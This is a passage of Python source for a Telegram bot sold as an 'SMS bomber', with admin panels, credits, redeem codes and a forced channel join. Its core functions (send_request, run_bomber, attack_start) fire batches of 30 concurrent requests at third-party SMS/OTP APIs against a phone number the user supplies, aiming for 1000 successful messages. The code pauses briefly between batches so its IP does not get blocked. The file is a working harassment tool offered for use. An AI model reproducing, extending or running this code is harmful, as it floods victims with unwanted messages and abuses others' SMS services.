        telebot.types.InlineKeyboardButton("🚫 BAN USER", callback_data="ban_user")
    )
    kb.add(
        telebot.types.InlineKeyboardButton("✅ UNBAN USER", callback_data="unban_user"),
        telebot.types.InlineKeyboardButton("💰 ADD CREDITS", callback_data="add_credits")
    )
    kb.add(
        telebot.types.InlineKeyboardButton("♾️ UNLIMITED CREDITS", callback_data="unlimited_credits"),
        telebot.types.InlineKeyboardButton("🔍 FIND USER", callback_data="find_user")
    )
    # NEW: Toggle Bonus feature button added here
    kb.add(
        telebot.types.InlineKeyboardButton("⚙️ TOGGLE DAILY BONUS", callback_data="toggle_bonus"),
        telebot.types.InlineKeyboardButton("📜 BANNED LIST", callback_data="banned_list")
    )
    kb.add(
        telebot.types.InlineKeyboardButton("🔄 RESET ALL CREDITS", callback_data="reset_all_credits"),
        telebot.types.InlineKeyboardButton("🔙 BACK TO MAIN", callback_data="back_to_main")
    )
    return kb

# NEW: Force Join Menu
def force_join_menu():
    kb = telebot.types.InlineKeyboardMarkup(row_width=1)
    kb.add(
        telebot.types.InlineKeyboardButton("📢 JOIN FIRST", url="https://t.me/fuckerbihari00"),
        telebot.types.InlineKeyboardButton("✅ I HAVE JOINED", callback_data="check_join")
    )
    return kb

def is_joined(user_id):
    if user_id in ADMIN_IDS: return True
    try:
        member = bot.get_chat_member("@fuckerbihari00", user_id)
        return member.status in ['member', 'creator', 'administrator']
    except:
        return False

# ================= START COMMAND (FIXED) =================
@bot.message_handler(commands=['start'])
def start_command(m):
    user_id = m.chat.id
    uid_str = str(user_id)
    
    # 1. Check if User is Banned
    if banned_col.find_one({"_id": uid_str}):
        bot.send_message(user_id, "🚫 YOU ARE BANNED!")
        return
        
    # 2. Check Force Join
    if not is_joined(user_id):
        bot.send_message(
            user_id, 
            "❌ **ACCESS DENIED!**\n\nPehle humara official channel join karein tabhi bot use kar payenge.", 
            parse_mode="Markdown", 
            reply_markup=force_join_menu()
        )
        return

    # 3. Create/Get User & Update Profile
    get_user(user_id)
    users_col.update_one(
        {"_id": uid_str},
        {"$set": {
            "username": m.from_user.username or "",
            "first_name": m.from_user.first_name or ""
        }}
    )
    
    # 4. Fetch Data & Settings
    user = users_col.find_one({"_id": uid_str}) or {}
    config = settings_col.find_one({"_id": "config"}) or {}
    bonus_status = "ON ✅" if config.get("daily_bonus", True) else "OFF ❌"

    welcome_text = f"""
🎯 **WELCOME TO SMS BOMBER BY @fuckerbihari00 ** 🎯

👤 **USER ID:** `{user_id}`
💰 **CREDITS:** `{user.get('credits', 0)}`
⚔️ **1 BOMB = 10 CREDITS**
📊 **TOTAL ATTACKS:** `{user.get('total_attacks', 0)}`

📌 **HOW TO USE:**
1. Click START BOMB button
2. Send 10 digit phone number
3. Wait for bombing to complete

🎁 **DAILY BONUS:** 50 CREDITS (Status: {bonus_status})

👑 **ADMIN:** Use /admin for admin panel
"""
    bot.send_message(user_id, welcome_text, parse_mode="Markdown", reply_markup=main_menu())


# ================= ADMIN COMMAND (UPDATED) =================
@bot.message_handler(commands=['admin'])
def admin_panel(m):
    if m.chat.id not in ADMIN_IDS:
        bot.send_message(m.chat.id, "❌ You are not authorized to use this command!")
        return
    bot.send_message(m.chat.id, "👑 **ADMIN CONTROL PANEL** 👑\n\nSelect an option below:", parse_mode="Markdown", reply_markup=admin_menu())

# ================= RESET CREDITS COMMAND (UPDATED) =================
@bot.message_handler(commands=['resetcredits'])
def reset_all_credits_cmd(m):
    if m.chat.id not in ADMIN_IDS:
        bot.send_message(m.chat.id, "❌ Admin only.")
        return
    # MongoDB me saare users ke credits ek sath 0 karein
    users_col.update_many({}, {"$set": {"credits": 0}})
    for admin_id in ADMIN_IDS:
        bot.send_message(admin_id, "✅ All users' credits have been reset to 0.")

# ================= CALLBACK HANDLERS (UPDATED) =================
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(c):
    user_id = c.from_user.id
    
    # 1. Ban Check (MongoDB)
    if banned_col.find_one({"_id": str(user_id)}):
        bot.answer_callback_query(c.id, "🚫 YOU ARE BANNED!", True)
        return

    # 2. Force Join Logic for "Check Join" button
    if c.data == "check_join":
        if is_joined(user_id):
            bot.answer_callback_query(c.id, "✅ Thank you for joining!", True)
            bot.delete_message(user_id, c.message.message_id)
            start_command(c.message) # Restart start flow
        else:
            bot.answer_callback_query(c.id, "❌ Abhi tak join nahi kiya!", True)
        return

    # 3. Toggle Daily Bonus (Admin Only)
    if c.data == "toggle_bonus":
        if user_id not in ADMIN_IDS: return
        config = settings_col.find_one({"_id": "config"})
        new_state = not config.get("daily_bonus", True)
        settings_col.update_one({"_id": "config"}, {"$set": {"daily_bonus": new_state}})
        status_text = "ENABLED ✅" if new_state else "DISABLED ❌"
        bot.answer_callback_query(c.id, f"Daily Bonus: {status_text}", True)
        # Admin menu refresh kar sakte hain yahan
        return

    # USER CALLBACKS
    if c.data == "start":
        # Force join check before starting
        if not is_joined(user_id):
            bot.send_message(user_id, "❌ Join @fuckerbihario first!", reply_markup=force_join_menu())
            return
        bot.send_message(user_id, "📱 **SEND 10 DIGIT NUMBER:**\n\nExample: `9876543210`", parse_mode="Markdown")
        bot.register_next_step_handler(c.message, attack_start)
        bot.answer_callback_query(c.id)

    elif c.data == "stop":
        if user_id in bombing_status:
            bombing_status[user_id] = False
            bot.answer_callback_query(c.id, "⏹️ BOMBING STOPPED", True)
        else:
            bot.answer_callback_query(c.id, "❌ NO ACTIVE BOMBING", True)

    elif c.data == "credits":
        user = get_user(user_id)
        bot.answer_callback_query(c.id, f"💰 YOUR CREDITS: {user['credits']}\n⚔️ 1 BOMB = 10 CREDITS", True)

    elif c.data == "daily":
        # Check if Bonus is ON or OFF in Settings
        config = settings_col.find_one({"_id": "config"})
        if not config.get("daily_bonus", True):
            bot.answer_callback_query(c.id, "⚠️ Daily Bonus is currently DISABLED by Admin.", True)
            return

        user = get_user(user_id)
        today = datetime.now().strftime("%Y-%m-%d")
        if user.get("last_daily") == today:
            bot.answer_callback_query(c.id, "❌ ALREADY CLAIMED TODAY!", True)
            return
        
        # MongoDB Update
        users_col.update_one({"_id": str(user_id)}, {"$inc": {"credits": 50}, "$set": {"last_daily": today}})
        bot.answer_callback_query(c.id, f"🎁 +50 CREDITS!\n💰 CLAIMED FOR TODAY", True)

    elif c.data == "mystats":
        user = get_user(user_id)
        stats_text = f"""
📊 **YOUR STATS**

👤 **USER ID:** `{user_id}`
💰 **CREDITS:** `{user.get('credits', 0)}`
⚔️ **TOTAL ATTACKS:** `{user.get('total_attacks', 0)}`
🎁 **LAST DAILY:** `{user.get('last_daily', 'Never')}`
        """
        bot.answer_callback_query(c.id)
        bot.send_message(user_id, stats_text, parse_mode="Markdown")

    elif c.data == "myid":
        bot.answer_callback_query(c.id, f"🆔 YOUR USER ID: {user_id}", True)

    elif c.data == "redeem_menu":
        bot.answer_callback_query(c.id)
        bot.send_message(user_id, "🎟️ **REDEEM CODE**\n\nSend code using:\n`/redeem YOUR_CODE`", parse_mode="Markdown")

    elif c.data == "help":
        help_text = """
❓ **HELP MENU** ❓

📌 **COMMANDS:**
/start - Start the bot
/redeem CODE - Redeem credit code

🖱️ **BUTTONS:**
⚔️ START BOMB - Start bombing a number
⏹️ STOP BOMB - Stop active bombing
💰 MY CREDITS - Check your balance
🎁 DAILY BONUS - Claim 50 free credits
📊 MY STATS - View your statistics
👤 MY ID - Show your user ID

💡 **TIPS:**
• Each bomb costs 10 credits
• Get daily bonus for free credits
• Redeem codes from admin
• Use STOP button to end bombing
        """
        bot.answer_callback_query(c.id)
        bot.send_message(user_id, help_text, parse_mode="Markdown")
    elif c.data == "back_to_main":
        bot.answer_callback_query(c.id)
        bot.send_message(user_id, "🏠 **MAIN MENU**", parse_mode="Markdown", reply_markup=main_menu())

    # ================= ADMIN CALLBACKS (MONGODB UPDATED) =================
    elif user_id in ADMIN_IDS:
        if c.data == "admin_stats":
            # MongoDB Aggregation for fast calculation
            total_users = users_col.count_documents({})
            banned_count = banned_col.count_documents({})
            
            # Summing all credits and attacks from all users
            pipeline = [
                {"$group": {
                    "_id": None,
                    "total_credits": {"$sum": "$credits"},
                    "total_attacks": {"$sum": "$total_attacks"}
                }}
            ]
            result = list(users_col.aggregate(pipeline))
            
            t_credits = result[0]['total_credits'] if result else 0
            t_attacks = result[0]['total_attacks'] if result else 0
            
            stats_text = f"""
📊 **BOT STATISTICS** 📊

👥 **TOTAL USERS:** `{total_users}`
🚫 **BANNED USERS:** `{banned_count}`
💰 **TOTAL CREDITS:** `{t_credits}`
⚔️ **TOTAL ATTACKS:** `{t_attacks}`
🎯 **ACTIVE APIS:** `{len(APIS)}`
            """
            bot.answer_callback_query(c.id)
            bot.send_message(user_id, stats_text, parse_mode="Markdown")

        elif c.data == "users_list":
            # Fetching top 20 users by credit amount
            users = users_col.find().sort("credits", -1).limit(20)
            total_count = users_col.count_documents({})
            
            users_text = "👥 **TOP USERS (BY CREDITS)**\n\n"
            for u in users:
                uid = u.get("_id")
                u_credits = u.get("credits", 0)
                u_attacks = u.get("total_attacks", 0)
                users_text += f"🆔 `{uid}` - 💰 {u_credits} - ⚔️ {u_attacks}\n"
            
            if total_count > 20:
                users_text += f"\n... and {total_count - 20} more users"
                
            bot.answer_callback_query(c.id)
            bot.send_message(user_id, users_text, parse_mode="Markdown")

        elif c.data == "gen_code":
            bot.answer_callback_query(c.id)
            bot.send_message(user_id, "🎟️ **GENERATE CODE**\n\nSend amount using:\n`/gen AMOUNT`", parse_mode="Markdown")

        elif c.data == "ban_user":
            bot.answer_callback_query(c.id)
            bot.send_message(user_id, "🚫 **BAN USER**\n\nSend user ID using:\n`/ban USER_ID`", parse_mode="Markdown")

        elif c.data == "unban_user":
            bot.answer_callback_query(c.id)
            bot.send_message(user_id, "✅ **UNBAN USER**\n\nSend user ID using:\n`/unban USER_ID`", parse_mode="Markdown")

        elif c.data == "add_credits":
            bot.answer_callback_query(c.id)
            bot.send_message(user_id, "💰 **ADD CREDITS**\n\nSend using:\n`/addcredits USER_ID AMOUNT`", parse_mode="Markdown")

        elif c.data == "unlimited_credits":
            # Admin gets 1 Million credits
            users_col.update_one({"_id": str(user_id)}, {"$set": {"credits": 999999}})
            bot.answer_callback_query(c.id, "♾️ UNLIMITED CREDITS UPDATED!", True)

        elif c.data == "find_user":
            bot.answer_callback_query(c.id)
            bot.send_message(user_id, "🔍 **FIND USER**\n\nSend user ID to find:\n`/find USER_ID`", parse_mode="Markdown")

        elif c.data == "banned_list":
            banned_users = list(banned_col.find())
            if not banned_users:
                bot.answer_callback_query(c.id, "No banned users", True)
                return
                
            banned_text = "🚫 **BANNED USERS**\n\n"
            for b in banned_users:
                banned_text += f"🆔 `{b['_id']}`\n"
            
            bot.answer_callback_query(c.id)
            bot.send_message(user_id, banned_text, parse_mode="Markdown")

        elif c.data == "reset_all_credits":
            # Efficiently reset all users to 0 credits
            users_col.update_many({}, {"$set": {"credits": 0}})
            bot.answer_callback_query(c.id, "✅ All credits reset to 0.", True)

# ========== FIND USER COMMAND (MONGODB UPDATED) ==========
@bot.message_handler(commands=['find'])
def find_user(m):
    if m.chat.id not in ADMIN_IDS:
        return
    args = m.text.split()
    if len(args) != 2:
        bot.send_message(m.chat.id, "Usage: `/find USER_ID`", parse_mode="Markdown")
        return
    
    target_id = args[1]
    # Direct MongoDB Search
    user = users_col.find_one({"_id": target_id})
    
    if not user:
        bot.send_message(m.chat.id, f"❌ User `{target_id}` not found in Database!", parse_mode="Markdown")
        return
        
    user_info = f"""
👤 **USER FOUND**

🆔 **ID:** `{target_id}`
💰 **Credits:** `{user.get('credits', 0)}`
⚔️ **Attacks:** `{user.get('total_attacks', 0)}`
🎁 **Last Daily:** `{user.get('last_daily', 'Never')}`
📝 **Username:** @{user.get('username', 'N/A')}
👤 **Name:** {user.get('first_name', 'N/A')}
    """
    bot.send_message(m.chat.id, user_info, parse_mode="Markdown")

# ========== ADMIN COMMANDS (MONGODB UPDATED) ==========

@bot.message_handler(commands=['gen'])
def generate_code(m):
    if m.chat.id not in ADMIN_IDS:
        return
    args = m.text.split()
    if len(args) != 2:
        bot.send_message(m.chat.id, "❌ Usage: `/gen <amount>`", parse_mode="Markdown")
        return
    try:
        amount = int(args[1])
    except:
        bot.send_message(m.chat.id, "❌ Invalid amount!")
        return
        
    # Generate 10 character unique code
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    
    # MongoDB me save (No limit on amount)
    codes_col.insert_one({"_id": code, "amount": amount})
    
    bot.send_message(
        m.chat.id, 
        f"✅ **CODE GENERATED**\n\n🎟️ CODE: `{code}`\n💰 AMOUNT: `{amount}` credits", 
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['ban'])
def ban_user(m):
    if m.chat.id not in ADMIN_IDS:
        return
    args = m.text.split()
    if len(args) != 2:
        bot.send_message(m.chat.id, "❌ Usage: `/ban USER_ID`")
        return
    target_id = args[1]
    
    # MongoDB Banned collection me add karein
    if not banned_col.find_one({"_id": target_id}):
        banned_col.insert_one({"_id": target_id, "ban_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
    
    bot.send_message(m.chat.id, f"✅ **USER BANNED:** `{target_id}`", parse_mode="Markdown")

@bot.message_handler(commands=['unban'])
def unban_user(m):
    if m.chat.id not in ADMIN_IDS:
        return
    args = m.text.split()
    if len(args) != 2:
        bot.send_message(m.chat.id, "❌ Usage: `/unban USER_ID`")
        return
    target_id = args[1]
    
    # MongoDB se remove karein
    banned_col.delete_one({"_id": target_id})
    bot.send_message(m.chat.id, f"✅ **USER UNBANNED:** `{target_id}`", parse_mode="Markdown")

@bot.message_handler(commands=['stats'])
def stats_admin(m):
    if m.chat.id not in ADMIN_IDS:
        return
        
    # MongoDB calculations
    total_users = users_col.count_documents({})
    banned_count = banned_col.count_documents({})
    
    # Aggregation for sums
    pipeline = [
        {"$group": {
            "_id": None,
            "total_credits": {"$sum": "$credits"},
            "total_attacks": {"$sum": "$total_attacks"}
        }}
    ]
    result = list(users_col.aggregate(pipeline))
    
    t_credits = result[0]['total_credits'] if result else 0
    t_attacks = result[0]['total_attacks'] if result else 0
    
    stats_msg = (
        f"📊 **GLOBAL STATISTICS**\n\n"
        f"👥 TOTAL USERS: `{total_users}`\n"
        f"🚫 BANNED: `{banned_count}`\n"
        f"💰 TOTAL CREDITS: `{t_credits}`\n"
        f"⚔️ TOTAL ATTACKS: `{t_attacks}`\n"
        f"🎯 ACTIVE APIS: `{len(APIS)}`"
    )
    bot.send_message(m.chat.id, stats_msg, parse_mode="Markdown")

@bot.message_handler(commands=['addcredits'])
def add_credits_admin(m):
    if m.chat.id not in ADMIN_IDS:
        return
    args = m.text.split()
    if len(args) != 3:
        bot.send_message(m.chat.id, "❌ Usage: `/addcredits <user_id> <amount>`")
        return
    target_id = args[1]
    try:
        amount = int(args[2])
    except:
        bot.send_message(m.chat.id, "❌ Invalid amount!")
        return
        
    # Atomic credit update in MongoDB
    new_balance = update_credits(target_id, amount)
    bot.send_message(m.chat.id, f"✅ Added `{amount}` credits to `{target_id}`\n💰 New balance: `{new_balance}`", parse_mode="Markdown")

@bot.message_handler(commands=['unlimited'])
def unlimited_credits_cmd(m):
    if m.chat.id not in ADMIN_IDS:
        return
    # Admin ko 1 Million credits set kar dena
    users_col.update_one({"_id": str(m.chat.id)}, {"$set": {"credits": 999999}})
    bot.send_message(m.chat.id, "♾️ **UNLIMITED CREDITS ACTIVATED!** (999,999)", parse_mode="Markdown")

# ========== BOMBING FUNCTIONS (FINAL OPTIMIZED) ==========

async def send_request(session, api, phone):
    """
    Har single request ko check karta hai ki wo success hui ya fail.
    Status codes like 200, 201, 204 ko Success maana jayega.
    """
    try:
        api_name = api["name"]
        data_payload = make_data(phone, api_name)
        
        # 5 second timeout taaki slow APIs bot ko hang na karein
        timeout = aiohttp.ClientTimeout(total=5) 
        
        headers = api.get("headers", {})
        
        if api["method"] == "POST":
            async with session.post(api["url"], headers=headers, data=data_payload, timeout=timeout) as r:
                return r.status in [200, 201, 202, 204]
        else:
            async with session.get(api["url"], headers=headers, timeout=timeout) as r:
                return r.status in [200, 201, 202, 204]
    except:
        # Timeout ya connection error par False return hoga
        return False

async def run_bomber(chat_id, phone):
    """
    Main loop jo 1000 Successful hits poore hone tak chalta rahega.
    """
    bombing_status[chat_id] = True
    
    msg = bot.send_message(
        chat_id, 
        f"⚔️ **BOMBING STARTED** ⚔️\n\n📱 TARGET: `{phone}`\n🎯 GOAL: `1000 Success SMS`\n⚡ SPEED: **Ultra Fast**", 
        parse_mode="Markdown"
    )
    
    success_count = 0
    failed_count = 0
    target_limit = 1000 
    
    formats = [phone, "91" + phone, "+91" + phone]
    
    async with aiohttp.ClientSession() as session:
        while bombing_status.get(chat_id, True):
            tasks = []
            
            # Batch of 20 concurrent requests for high speed
            for _ in range(30):
                api = random.choice(APIS)
                target = random.choice(formats)
                tasks.append(asyncio.create_task(send_request(session, api, target)))
            
            # Ek sath saari requests fire karna
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Results calculate karna
            for res in results:
                if res is True:
                    success_count += 1
                else:
                    failed_count += 1
            
            total_attempts = success_count + failed_count
            
            # UI Update: Har 40 attempts par user ko live status dikhana
            if total_attempts % 40 == 0 or success_count >= target_limit:
                try:
                    # MongoDB se live credits uthana (Optional display)
                    user_data = users_col.find_one({"_id": str(chat_id)})
                    remaining = user_data.get("credits", 0) if user_data else 0
                    
                    bot.edit_message_text(
                        f"⚔️ **BOMBING IN PROGRESS** ⚔️\n\n"
                        f"📱 TARGET: `{phone}`\n"
                        f"✅ SUCCESSFUL: `{success_count}`\n"
                        f"❌ FAILED: `{failed_count}`\n"
                        f"💰 CREDITS: `{remaining}`\n\n"
                        f"⏹️ STOP TO CANCEL",
                        chat_id, msg.message_id, parse_mode="Markdown"
                    )
                except:
                    pass
            
            # Target reached check
            if success_count >= target_limit:
                break
                
            # Safety Switch: Agar sari APIs dead hon toh 600 attempts ke baad bot ruk jayega
            if total_attempts >= 9000:
                break
                
            # Thoda sa gap taaki IP block na ho
            await asyncio.sleep(.5)

    # Final Finishing Message
    bombing_status[chat_id] = False
    
    final_text = (
        f"✅ **BOMBING FINISHED** ✅\n\n"
        f"📱 TARGET: `{phone}`\n"
        f"🎯 SUCCESSFUL HITS: `{success_count}`\n"
        f"⚠️ TOTAL ATTEMPTS: `{success_count + failed_count}`\n"
        f"🔄 STATUS: Completed"
    )
    
    try:
        bot.send_message(chat_id, final_text, parse_mode="Markdown")
    except:
        pass
# ================= ATTACK HANDLER (FINAL) =================

def attack_start(m):
    user_id = m.chat.id
    phone = m.text.strip()
    
    # 1. Check Force Join (Must join @detorlab)
    if not is_joined(user_id):
        bot.send_message(
            user_id, 
            "❌ **Access Denied!**\n\nPehle humara official channel join karein tabhi bot use kar payenge.", 
            parse_mode="Markdown", 
            reply_markup=force_join_menu()
        )
        return

    # 2. Check Valid Number (Exactly 10 digits)
    if not phone.isdigit() or len(phone) != 10:
        bot.send_message(user_id, "❌ **INVALID NUMBER!**\nSirf 10 digit ka number bhejein.\nExample: `9876543210`", parse_mode="Markdown")
        return

    # 3. Check Protected Numbers (Admin/Owner safeguard)
    if phone in PROTECTED_NUMBERS:
        bot.send_message(user_id, "🛡️ **TARGET PROTECTED!**\nIs number par bombing allowed nahi hai.", parse_mode="Markdown")
        return

    # 4. Check & Deduct Credits from MongoDB
    user_id_str = str(user_id)
    user_data = users_col.find_one({"_id": user_id_str})
    
    # Admin ke liye free, users ke liye 10 credits deduction
    if user_id not in ADMIN_IDS:
        if not user_data or user_data.get("credits", 0) < 10:
            bot.send_message(user_id, "❌ **INSUFFICIENT CREDITS!**\n\nDaily bonus claim karein ya admin se contact karein.", parse_mode="Markdown")
            return
        
        # Atomic Update: Deduct 10 credits and increment attack count
        users_col.update_one(
            {"_id": user_id_str}, 
            {"$inc": {"credits": -10, "total_attacks": 1}}
        )
    else:
        # Admin ke liye sirf attack count badhega
        users_col.update_one({"_id": user_id_str}, {"$inc": {"total_attacks": 1}})

    # 5. Start Background Async Bomber
    def run_async_wrapper():
        # Naya event loop create karna background thread ke liye
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(run_bomber(user_id, phone))
        loop.close()

    # Threading use kar rahe hain taaki bot handle dusre users ko block na kare
    threading.Thread(target=run_async_wrapper, daemon=True).start()

    bot.send_message(
        user_id, 
        f"🎯 **BOMBING INITIATED**\n\n📱 TARGET: `{phone}`\n💳 COST: `10 Credits`", 
        parse_mode="Markdown"
    )

# ================= RUN BOT (FINAL MAIN LOOP) =================

if __name__ == "__main__":
    print("=" * 40)
    print("🔥 DETOR SMS BOMBER v4.0 🔥")
    print("=" * 40)
    print(f"👑 ADMINS: {len(ADMIN_IDS)}")
    print(f"📊 DATABASE: Connected (MongoDB)")
    print(f"🎯 APIS LOADED: {len(APIS)}")
    print("=" * 40)
    print("✅ BOT IS LIVE NOW...")
    print("=" * 40)
    
    # Webhook remove karke fresh polling start karna
    bot.remove_webhook()
    
    while True:
        try:
            # infinity_polling ensure karta hai ki bot network errors par crash na ho
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"Polling Error: {e}")
            time.sleep(5) # 5 second wait karke firse restart
